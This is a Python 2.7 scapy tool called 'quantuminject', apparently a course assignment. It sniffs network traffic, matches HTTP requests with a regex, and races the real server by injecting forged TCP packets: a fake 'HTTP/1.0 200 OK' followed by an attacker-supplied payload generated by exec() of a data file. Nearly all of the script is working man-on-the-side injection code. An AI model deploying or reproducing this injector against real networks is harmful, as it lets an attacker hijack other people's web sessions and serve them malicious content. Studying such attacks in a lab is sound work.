#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
import os as OS
import sys as System
import subprocess as Process
from datetime import datetime as Horai
import re as Regex
import getopt

#Justification is: Functions in this script require sudo regardless of whether it is the main script or not.

if OS.getuid() != 0:
    print "This script will require root privileges. Attempting to elevate..."
    Process.call(["sudo"] + System.argv)
    exit(77)

from scapy.all import *

interface = None
spoofed_payload = None
regex = None

def handle(packet):
    if (
        packet.haslayer(IP) and
        (packet[IP].src == '192.168.64.1' or
        packet[IP].dst == '192.168.64.1')
    ):
        packet.show()

    if (
        packet.haslayer(Raw) and
        Regex.search(regex, packet[Raw].load) != None
    ):
        spoofed_packet = packet

        del spoofed_packet[IP].len
        del spoofed_packet[IP].chksum
        del spoofed_packet[TCP].chksum

        spoofed_packet[Ether].src, spoofed_packet[Ether].dst = packet[Ether].dst, packet[Ether].src
        spoofed_packet[IP].src, spoofed_packet[IP].dst = packet[IP].dst, packet[IP].src
        spoofed_packet[IP].flags = 'DF'
        spoofed_packet[TCP].sport, spoofed_packet[TCP].dport =  packet[TCP].dport, packet[TCP].sport
        spoofed_packet[TCP].seq, spoofed_packet[TCP].ack =  packet[TCP].ack, packet[TCP].seq + len(packet[Raw].load)
        spoofed_packet[TCP].flags = 'PA'
        spoofed_packet[TCP].window = 4115

        # Timestamp Management
        ts = None
        for option in spoofed_packet[TCP].options:
            if option[0] == 'Timestamp':
                ts = ('Timestamp', (option[1][1] + 100, option[1][0]))

        spoofed_packet[TCP].options = [('NOP', None), ('NOP', None), ts]
        

        # Send HTTP OK
        spoofed_packet[Raw].load = 'HTTP/1.0 200 OK\r\n'
        sendp(spoofed_packet, iface=interface)

        # Send spoofed payload
        spoofed_packet[TCP].seq += len(spoofed_packet[Raw].load)
        spoofed_packet[TCP].flags = 'FPA'
        exec(spoofed_payload)
        spoofed_packet[Raw].load = payload
        sendp(spoofed_packet, iface=interface)


# It's a goshdarn script Karim writing code globally is what you do but whatever
def main(argv):
    global interface
    global spoofed_payload
    global regex

    def printHelp():
        print """
        (python2.7 |./)quantuminject [­-i interface] [­-r regexp] [­-d datafile] expression

        -i --interface Listen on network device (e.g., eth0). If not specified, quantuminject should select a default interface to listen on. The same interface should be used for packet injection.

        ­-r --regex Use regular expression to match the request packets for which a response will be spoofed.

        ­-d --data Read the python script that will generate the TCP payload of the spoofed response packet from <datafile>

        expression is a packet filter.

        Defaults will be used for anything not provided.
        """

    datafile = None

    try:
        opts, args = getopt.getopt(argv[1:], 'i:r:d:h', ['interface=', 'regexp=', 'datafile=', 'help'])
    except getopt.GetoptError:
        printHelp()
        exit(64)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            printHelp()
            exit(0)
        elif opt in ('-i', '--interface'):
            interface = arg
        elif opt in ('-r', '--regexp'):
            regex = arg
        elif opt in ('-d', '--datafile'):
            datafile = arg
        else:
            printHelp()
            exit(64)

    if not datafile:
        datafile = "example_payload.py"

    if not interface:
        interface = "en0"

    if not regex:
        regex = r'^GET \/ HTTP\/1\.1'

    try:
        with open(datafile, 'r') as file:
            spoofed_payload = file.read()
    except:
        print "Could not read " + datafile + "."
        exit(-1)

    sniff(prn=handle, iface=interface, filter=' '.join(args))

if __name__ == "__main__":
    main(sys.argv)